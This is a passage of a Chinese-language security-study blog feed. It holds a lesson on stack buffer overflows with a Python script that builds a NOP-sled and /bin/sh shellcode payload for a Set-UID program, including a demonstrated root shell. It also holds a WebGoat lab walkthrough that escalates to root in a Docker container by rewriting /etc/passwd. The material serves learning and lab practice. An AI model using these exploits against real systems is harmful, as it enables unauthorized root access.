id="5-4-Constructing-the-Input-File-构建badfile的内容"><a href="#5-4-Constructing-the-Input-File-构建badfile的内容" class="headerlink" title="5.4 Constructing  the Input File 构建badfile的内容"></a>5.4 Constructing  the Input File 构建badfile的内容</h4><p>我们现在可以为坏文件构造内容了。图4.7说明了输入文件的结构（即badfile）。由于badfile包含难以使用文本编辑器输入的二进制数据，所以我们编写一个Python程序(称为plale.py)来生成文件。该代码如下图所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">shellcode= (</span><br><span class="line"><span class="string">&quot;\x31\xc0&quot;</span> <span class="comment"># xorl %eax,%eax</span></span><br><span class="line"><span class="string">&quot;\x50&quot;</span> <span class="comment"># pushl %eax</span></span><br><span class="line"><span class="string">&quot;\x68&quot;</span><span class="string">&quot;//sh&quot;</span> <span class="comment"># pushl $0x68732f2f</span></span><br><span class="line"><span class="string">&quot;\x68&quot;</span><span class="string">&quot;/bin&quot;</span> <span class="comment"># pushl $0x6e69622f</span></span><br><span class="line">    <span class="string">&quot;\x89\xe3&quot;</span> <span class="comment"># movl %esp,%ebx</span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span> <span class="comment"># pushl %eax</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span> <span class="comment"># pushl %ebx</span></span><br><span class="line">    <span class="string">&quot;\x89\xe1&quot;</span> <span class="comment"># movl %esp,%ecx</span></span><br><span class="line">    <span class="string">&quot;\x99&quot;</span> <span class="comment"># cdq</span></span><br><span class="line">    <span class="string">&quot;\xb0\x0b&quot;</span> <span class="comment"># movb $0x0b,%al</span></span><br><span class="line">    <span class="string">&quot;\xcd\x80&quot;</span> <span class="comment"># int $0x80</span></span><br><span class="line">).encode(’latin-<span class="number">1</span>’)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOPs</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>)) ➀</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode at the end</span></span><br><span class="line">start = <span class="number">300</span> - <span class="built_in">len</span>(shellcode)</span><br><span class="line">content[start:] = shellcode ➁</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the address at offset 112</span></span><br><span class="line">ret = <span class="number">0xbfffeaf8</span> + <span class="number">120</span> ➂</span><br><span class="line">content[<span class="number">112</span>:<span class="number">116</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=’little’) ➃</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(’badfile’, ’wb’) <span class="keyword">as</span> f:</span><br><span class="line">f.write(content)</span><br></pre></td></tr></table></figure><p>在给定的代码中，shellcode[]包含一个恶意代码的副本。稍后我们将讨论如何编写这样的代码。在第➀行中，我们创建了一个大小为300字节的数组，并用0x90(NOP)填充它。然后，我们将shellcode放在这个数组的末尾（行➁）。</p><p>我们计划使用0xbfffeaf8+120作为返回地址（行➂），所以我们需要把这个值放到数组中相应的位置。根据我们的gdb结果，返回地址字段从偏移量112开始，到偏移量116（不包括116）结束。因此，在第➃行中，我们将地址放入内容中[112：116]。当我们将一个多字节数放入内存时，我们需要考虑哪个字节应该放入低地址。这被称为字节顺序。有些计算机架构使用大端，有些使用小端。x86体系结构使用小端顺序，因此在Python中，当将4字节地址放入内存时，我们需要使用byteorder=‘litte’来指定字节顺序。</p><ul><li><p>需要注意的是，在第➂行中，我们没有使用之前计算过的0xbfffeaf8+8；相反，我们使用一个更大的值0xbfffeaf8+120。这是有原因的：地址0xbfffefaf8确定时我们使用了debugging模式，foo函数的stack frame当程序运行在gdb中和直接运行时可能时不同的，因为gdb可能在一开始push一些额外的数据到stack，导致stack frame被分配得比程序直接运行时更深。因此，我们可以跳转到的第一个地址可能高于0xbfffeaf8+8。这就是为什么我们选择使用0xbfffeaf8+120。如果攻击失败，读者可以尝试不同的offset。</p></li><li><p>要记住的另一件重要的事情是0xbfffeaf8+nnn的结果在它的任何一个字节中都不应该包含零，否则badfile内容的中间位置会出现一个0（’\0’），导致之前的strcpy()函数结束复制，没有复制这个0之后的任何内容。例如，如果我们使用0xbfffeaf8+8，我们将得到0xbfffeb00，并且结果的最后一个字节是零。</p></li></ul><p><strong>Run the exploit</strong>: 我们现在可以运行exploit.py来生成badfile。一旦文件构建，我们运行易受攻击的Set-UID程序，它从badfile中复制内容，导致缓冲区溢出。</p><p>下面的结果表明，我们已经成功地获得了根权限：我们得到了#提示符，并且id命令的结果显示，该进程的有效用户id(euid)为0</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod u+x exploit.py <span class="comment">#make it executable</span></span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> rm badfile</span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> exploit.py</span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> ./stack</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> id                 <span class="comment">#Got the root shell!</span></span> </span><br><span class="line">uid=1000(seed) gid=1000(seed) euid=0(root) groups=0(root), ...</span><br></pre></td></tr></table></figure><h3 id="6-Attacks-with-Unknown-Address-and-Buffer-Size在地址和缓冲区大小未知的情况下进行攻击"><a href="#6-Attacks-with-Unknown-Address-and-Buffer-Size在地址和缓冲区大小未知的情况下进行攻击" class="headerlink" title="6. Attacks with Unknown Address and Buffer Size在地址和缓冲区大小未知的情况下进行攻击"></a>6. Attacks with Unknown Address and Buffer Size在地址和缓冲区大小未知的情况下进行攻击</h3><p>在上一节中，我们展示了在我们知道缓冲区地址和大小时如何进行攻击。在现实世界中，我们可能无法知道它们的确切值。对于针对远程服务器的攻击尤其如此，因此我们与在上一节中所做的不同，我们将无法调试目标程序。在本节中，我们将学习一些技术，以允许我们在不知道关于目标程序的所有信息的情况下启动攻击。</p><h4 id="6-1-Knowing-the-Range-of-Buffer-Size"><a href="#6-1-Knowing-the-Range-of-Buffer-Size" class="headerlink" title="6.1 Knowing the Range of Buffer Size"></a>6.1 Knowing the Range of Buffer Size</h4><p>对于缓冲区溢出攻击，有两个关键的信息片段：缓冲区的地址和大小。首先让我们假设我们知道缓冲区的地址是A=0xbfffea8c（这个假设将稍后取消），但我们不知道缓冲区的确切大小；我们只知道它在10到100的范围内。显然，我们可以使用蛮力方法，尝试遍在10到100之间的所有值。问题是我们是否能在只尝试一次的前提下做到。在现实世界中，蛮力攻击很容易触发警报，所以我们尝试次数越少越好。</p><p>缓冲区的大小决定了返回地址的位置。在不知道实际的缓冲区大小的情况下，我们不知道应该使用输入字符串（即坏文件）中的哪个区域来保存返回地址。猜测是一种方法，但我们有一个更好的解决方案：我们不是把return address仅仅放在一个位置，而是把它放在所有可能的位置，这样的话哪个位置是实际return address的位置并不重要。这种技术被称为spraying（喷洒），也就是说，我们用返回地址喷洒缓冲区。</p><p>由于缓冲区大小的范围在10到100之间，返回地址字段和缓冲区开始之间的实际距离最多为100加上一些小值（编译器可能会在缓冲区结束后添加额外的空间）；我们使用120。如果我们用返回地址（记为RT）喷洒缓冲区的前120个字节（每个地址为4个字节），我们就能保证其中某一个将覆盖实际的return address字段。图4.8显示了badfile内容是什么样子的。</p><p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649229770023.png" alt="uTools_1649229770023"></p><p>我们需要确定RT的值，从上图中，我们可以看到第一个NOP指令在0xbfffea8c+120（&amp;buffer+120，下文中称A=&amp;buffer）的位置上，由于我们认为A的值我们是知道的，我们可以算出 A+120 = 0xbfffea8c + 120 = 0xbfffeb04，用这个地址作为RT值。事实上，不止这个值，只要在A+120 到NOP结束我们的恶意代码开始之前的所有地址值都可以作为RT，都可以跳转到我们的恶意代码的位置。</p><h4 id="6-2-了解缓冲区地址的范围Knowing-the-Range-of-the-Buffer-Address"><a href="#6-2-了解缓冲区地址的范围Knowing-the-Range-of-the-Buffer-Address" class="headerlink" title="6.2 了解缓冲区地址的范围Knowing the Range of the Buffer Address"></a>6.2 了解缓冲区地址的范围<strong>Knowing the Range of the Buffer Address</strong></h4><p>让我们进一步解除对buffer地址的假设；假设我们不知道buffer地址的确切值，但我们知道这个值肯定在一个确定的A到A+100之间。我们对buffer size的假设仍然与之前相同，我们知道它的变化范围在10到100之间，我们希望构造一个有效的payload，以期所以无论缓冲区地址是什么，只要它在指定的范围内（A到A+100），我们的有效负载就可以成功地利用该漏洞。</p><p>我们仍然使用spraying技术来构建缓冲区的前120字节，然后我们放了150字节的NOP，然后是恶意代码。在这种方法下，如果缓冲区的地址为X，则NOP部分将在[X+120，X+270]的范围内。问题是，我们不知道X，因此我们不知道NOP部分的确切范围。由于X在[A，A+100]的范围内，让我们枚举X的所有可能的值，并看看它们的NOP部分在哪里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Buffer Address NOP Section</span><br><span class="line">--------------------------------------</span><br><span class="line">A [A + 120, A + 270]</span><br><span class="line">A+4 [A + 124, A + 274]</span><br><span class="line">A+8 [A + 128, A + 278]</span><br><span class="line">......</span><br><span class="line">A+100 [A + 220, A + 370]</span><br></pre></td></tr></table></figure><p>要找到一个适用于所有可能的缓冲区地址的NOP，NOP必须与上面所示的所有NOP部分相结合。这就是[A+220，A+270]。即，在此范围内的任何地址都可以用于返回地址RT。</p><h4 id="6-3-A-General-Solution一般性的解决方案"><a href="#6-3-A-General-Solution一般性的解决方案" class="headerlink" title="6.3  A General Solution一般性的解决方案"></a>6.3  <strong>A General Solution</strong>一般性的解决方案</h4><p>让我们概括一下刚才讨论的关于可以在攻击中使用的返回地址值。假设buffer address在[A，A+H]范围内，buffer中最开始的S个字节用于喷洒目的（RT部分），缓冲区接下来的L字节填充NOP指令（NOP部分）。让我们找出我们可以为返回地址RT使用哪些值（参见图4.9），我们设L为NOP段的长度。</p><ul><li>如果实际地址X=A，NOP段的位置在[A+S, A+S+L]，任何在这个范围内的数字可以作为RT的值</li><li>如果实际地址X=A+4，NOP段的位置在[(A+4)+S, (A+4)+S+L]，任何在这个范围内的数字可以作为RT的值</li><li>如果实际地址X=A+H，NOP段的位置在[(A+H)+S, (A+H)+S+L]，任何在这个范围内的数字可以作为RT的值</li></ul><p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649232456404.png" alt="uTools_1649232456404"></p><p>如果我们想找到一个适用于所有可能的缓冲区地址的RT值，它必须与X=A、A+4、…，A+H的所有范围相结合。从图4.9中，我们可以看到连接是[A+H+S，A+S+L)。此范围内的任何数字都可以用于返回地址RT。</p><p>一些读者可能会立即发现，如果H大于L，则上述范围的下界大于上限，该范围是不可能成立的，这样的话RT的值不能满足所有的buffer address。直观地说，如果buffer address不确定的范围太大，而我们放置NOP指令的空间太小，这种情况下我们将无法找到RT的完美解法。为了至少有一个可取的RT，我们必须保证H&lt;L。</p><p>由于L是由有效负载大小payload size决定的，这个值又取决于脆弱的程序可以从我们这里获得多少字节，因此我们将不能通过无节制地增加L来满足不等式。</p><p>显然，我们也不能减少缓冲区地址的指定范围的宽度H。但我们可以把这个范围分解成更小的子范围，每个子范围都有一个更小的宽度H‘。只要H‘小于L，我们就能找到一个解。基本上，如果范围太宽，我们将它分成更小的子范围，然后为每个子范围构造一个恶意的有效负载。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Buffer Overflow Attack ，part1：基本原理&lt;/p&gt;</summary>
    
    
    
    
    <category term="Buffer Overflow Attack" scheme="http://example.com/tags/Buffer-Overflow-Attack/"/>
    
    <category term="C语言" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat安装+General</title>
    <link href="http://example.com/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/"/>
    <id>http://example.com/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/</id>
    <published>2022-04-04T18:21:59.000Z</published>
    <updated>2022-04-04T18:28:04.727Z</updated>
    
    <content type="html"><![CDATA[<p>WebGoat 安全学习计划 Part 1</p><span id="more"></span><h2 id="用docker启动webgoat"><a href="#用docker启动webgoat" class="headerlink" title="用docker启动webgoat"></a>用docker启动webgoat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8080:8080 -p 9090:9090 -p 8888:8888 -e TZ=Europe/Amsterdam webgoat/goatandwolf:latest</span><br></pre></td></tr></table></figure><p>之后：通过浏览器访问<a href="http://localhost:8080/WebGoat">http://localhost:8080/WebGoat</a></p><ul><li><p>注意：网址中的<em>WebGoat</em>，必须区分大小写！</p></li><li><p>注意：docker下载卡住的问题，用镜像参考：<a href="https://www.cnblogs.com/manmanchanglu/p/11968269.html阿里云很顶">https://www.cnblogs.com/manmanchanglu/p/11968269.html阿里云很顶</a></p></li></ul><p>我的本地VMware虚拟机：</p><p><a href="http://192.168.146.141:8080/WebGoat/login">http://192.168.146.141:8080/WebGoat/login</a></p><p><a href="http://192.168.146.141:9090/login">http://192.168.146.141:9090/login</a></p><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1648645754057.png" alt="uTools_1648645754057"></p><h2 id="General"><a href="#General" class="headerlink" title="General"></a>General</h2><h3 id="HTTP-Basics"><a href="#HTTP-Basics" class="headerlink" title="HTTP Basics"></a>HTTP Basics</h3><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1649081157493.png" alt="uTools_1649081157493"></p><p>用Get还是Post很简单，get是url传参：”?key=value”</p><p>这个看样子是用Post，随便填点啥，先go，用burpsuite抓包看看</p><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1649081220726.png" alt="uTools_1649081220726"></p><p>报文头的最后一行：77, POST都出现了</p><h3 id="HTTP-Basics-1"><a href="#HTTP-Basics-1" class="headerlink" title="HTTP Basics"></a>HTTP Basics</h3><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1649086409212.png" alt="uTools_1649086409212"></p><p>让修改request头到规定的样子，我们用burp suite抓包，右键Change Request method</p><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1649086469910.png" alt="uTools_1649086469910"></p><p>右键send to repeater，在repeater上修改，之后点send，收到response</p><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1649086626579.png" alt="uTools_1649086626579"></p><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1649086640671.png" alt="uTools_1649086640671"></p><p>可以看到response上提示成功了，我们回到Proxy，将Repeater上的内容粘过去，关闭intercept，发包出去，题目就完成了。</p><h3 id="Developer-Tools"><a href="#Developer-Tools" class="headerlink" title="Developer Tools"></a>Developer Tools</h3><ol><li>F12-&gt;Console-&gt;CtrL cv: webgoat.customjs.phoneHome()-&gt;submit结果</li></ol><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1649087391762.png" alt="uTools_1649087391762"></p><ol><li>F12-&gt;Network-&gt;找network包点开-&gt;Headers-&gt;查阅networkNum</li></ol><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1649087711796.png" alt="uTools_1649087711796"></p><h3 id="Crypto-Basics"><a href="#Crypto-Basics" class="headerlink" title="Crypto Basics"></a>Crypto Basics</h3><ol><li><p>直接滚去Base64解密</p></li><li><p>base64解密结果：;&gt;+&gt;=&gt;,:/&gt;,,(0-; 这个信息是用IBM的<strong>WebSphere</strong>工具中的编码规则处理的！！！所以我们从网上找到专门解码WebSphere规则的应用进行解码：<a href="http://www.sysman.nl/wasdecoder/">http://www.sysman.nl/wasdecoder/</a></p></li></ol><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1649089039058.png" alt="uTools_1649089039058"></p><ol><li><p>在线反向硬破解MD5明文网站<a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p></li><li><p>生成模数的命令：</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lyq@lyq-virtual-machine:~/Desktop$ touch sk</span><br><span class="line">lyq@lyq-virtual-machine:~/Desktop$ vim sk</span><br><span class="line">lyq@lyq-virtual-machine:~/Desktop$ openssl rsa -in ./sk -modulus</span><br></pre></td></tr></table></figure><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1649089792965.png" alt="uTools_1649089792965"></p><p>生成签名的指令：此处用RAW signatures</p><p>openssl资料：<a href="https://www.openssl.net.cn/docs/224.html">https://www.openssl.net.cn/docs/224.html</a></p><p>dgst用于数据摘要。</p><p>-sign    privatekeyfile</p><p>​    用privatekeyfile中的私钥签名。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quotquot; | openssl dgst -sign ./sk -sha256 -out ./dgst.txt</span><br><span class="line">base64 ./dgst.txt &gt; result</span><br><span class="line"><span class="meta">#</span><span class="bash"> result中的内容就是签名</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>先敲题目给的命令，之后进入对应打开了的容器</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lyq@lyq-virtual-machine:~/Desktop$ docker run -d webgoat/assignments:findthesecret</span><br><span class="line"><span class="meta">#</span><span class="bash"> -d默认放到了后台去运行docker，不会有显式的命令行</span></span><br><span class="line">lyq@lyq-virtual-machine:~/Desktop$ sudo docker container ls</span><br><span class="line">CONTAINER ID        IMAGE                               COMMAND                  CREATED              STATUS              PORTS</span><br><span class="line">                 NAMES</span><br><span class="line">a9b080a12c88        webgoat/assignments:findthesecret   &quot;/bin/bash /home/web…&quot;   About a minute ago   Up About a minute</span><br><span class="line">                 sharp_dubinsky</span><br><span class="line">b22c19eb35f1        webgoat/goatandwolf:latest          &quot;/bin/sh -c &#x27;/bin/ba…&quot;   5 hours ago          Up 5 hours          0.0.0.0:8080-&gt;8080/tcp, 0.0.0.0:8888-&gt;8888/tcp, 0.0.0.0:9090-&gt;9090/tcp   wonderful_ride</span><br><span class="line"><span class="meta">#</span><span class="bash"> 可以看到展示出的两个docker容器，我们刚刚新建的是container id为a9b080a12c88的容器</span></span><br><span class="line">lyq@lyq-virtual-machine:~/Desktop$ docker exec -it a9b080a12c88 bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> 用<span class="built_in">exec</span> -it进入容器里面，发现死路，不知道下一步怎么解</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1649091660470.png" alt="uTools_1649091660470"></p><p>参考网上的解决方案<a href="https://www.rizkymd.com/2021/05/walkthrough-webgoat-assignment-crypto.html">https://www.rizkymd.com/2021/05/walkthrough-webgoat-assignment-crypto.html</a></p><p>原题目提示：</p><ul><li>After starting the docker container enter the container using docker exec -ti _dockerid_ /bin/bash</li><li>Try to gain access to /root. Try to become user root by su -</li><li>Try to change the /etc/shadow file using docker cp</li></ul><p>我们需要</p><ol><li>从container中把存了UID和GID的文件 /etc/passwd 拷贝下来</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp a9b080a12c88:/etc/passwd test.passwd</span><br></pre></td></tr></table></figure><ol><li><p>查看这个复制下来的test.passwd</p></li><li><p>编辑这个test.passwd，将webgoat UID和GID 从1000:1000改成0:0（最后一行）</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/bin/false</span><br><span class="line">webgoat:x:0:0::/home/webgoat:</span><br></pre></td></tr></table></figure><p>为什么这么改？？参考：<a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/</a></p><p>这里有对/etc/passwd文件的讲解</p><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/passwd-file-791527.png" alt="img"></p><ol><li><strong>Username</strong>: It is used when user logs in. It should be between 1 and 32 characters in length.</li><li><strong>Password</strong>: An x character indicates that encrypted password is stored in <a href="https://www.cyberciti.biz/faq/understanding-etcshadow-file/">/etc/shadow file</a>. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file.</li><li><strong>User ID (UID)</strong>: Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.</li><li><strong>Group ID (GID)</strong>: The primary group ID (stored in /etc/group file)</li><li><strong>User ID Info (GECOS)</strong>: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.</li><li><strong>Home directory</strong>: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /</li><li><strong>Command/shell</strong>: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell. For example, sysadmin can use the nologin shell, which acts as a replacement shell for the user accounts. If shell set to /sbin/nologin and the user tries to log in to the Linux system directly, the /sbin/nologin shell closes the connection.</li></ol><p>大意就是：3，4两个位置分别是User ID和Group ID字段，而UID=0是专门为root用户保留的，UID 1-99 为其他预定义帐户保留。进一步的 UID 100-999 由系统保留用于管理和系统帐户/组，因此我们的普通用户（eg: webgoat）是从序号1000开始的，我们把webgoat的字段改成0:0, 就相当于赋予了webgoat用户一个root权限。</p><ol><li>将这个改过的test.passwd 从本地系统拷贝回Container</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp test.passwd a9b080a12c88:/etc/passwd</span><br></pre></td></tr></table></figure><ol><li>再次进入容器，此时理论上我们有了root权限，可以进我们之前进不去的root目录</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it a9b080a12c88 /bin/bash</span><br></pre></td></tr></table></figure><ol><li>到 /root/目录下，发现只有一个default_secret文件，这里存着的就是私钥。我们再利用题目给的命令进行解密。（实际上我是用—user root进入root权限的）</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lyq@lyq-virtual-machine:~/Desktop$ sudo docker exec -it --user root a9b080a12c88 /bin/bash</span><br><span class="line">root@a9b080a12c88:/# ls</span><br><span class="line">bin   dev               etc   lib    media  opt   root  sbin  sys  usr</span><br><span class="line">boot  docker-java-home  home  lib64  mnt    proc  run   srv   tmp  var</span><br><span class="line">root@a9b080a12c88:/# cd root</span><br><span class="line">root@a9b080a12c88:~# ls</span><br><span class="line">default_secret</span><br><span class="line">root@a9b080a12c88:~# echo &quot;U2FsdGVkX199jgh5oANElFdtCxIEvdEvciLi+v+5loE+VCuy6Ii0b+5byb5DXp32RPmT02Ek1pf55ctQN+DHbwCPiVRfFQamDmbHBUpD7as=&quot; | openssl enc -aes-256-cbc -d -a -kfile default_secret</span><br><span class="line">Leaving passwords in docker images is not so secure</span><br></pre></td></tr></table></figure><p>结果截图：</p><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1649095531918.png" alt="uTools_1649095531918"></p><p>答案：default_secret，Leaving passwords in docker images is not so secure</p><p>一点疑惑：</p><p>当我用<strong>docker exec -it a9b080a12c88 /bin/bash</strong>命令进去之后，没有预想中的root，反而变成了daemon用户，而不是webgoat，不理解为什么。</p><p><img src="/2022/04/05/WebGoat%E5%AE%89%E8%A3%85-General/uTools_1649095704263.png" alt="uTools_1649095704263"></p><p>如果我直接用docker命令参数<strong>—user root </strong>，也能成功用root权限进入容器中，那么问题就来了，有必要弄这么麻烦改配置文件吗？是不是直接就可以进root呢？？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lyq@lyq-virtual-machine:~/Desktop$ sudo docker exec -it --user root a9b080a12c88 /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这样也完全可行？？</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;WebGoat 安全学习计划 Part 1&lt;/p&gt;</summary>
    
    
    
    
    <category term="WebGoat" scheme="http://example.com/tags/WebGoat/"/>
    
    <category term="docker" scheme="http://example.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>LintCode-java：872-终止进程.md</title>
    <link href="http://example.com/2022/01/15/LintCode-java%EF%BC%9A872-%E7%BB%88%E6%AD%A2%E8%BF%9B%E7%A8%8B-md/"/>
    <id>http://example.com/2022/01/15/LintCode-java%EF%BC%9A872-%E7%BB%88%E6%AD%A2%E8%BF%9B%E7%A8%8B-md/</id>
    <published>2022-01-15T07:04:50.000Z</published>
    <updated>2022-01-15T07:05:56.909Z</updated>
    
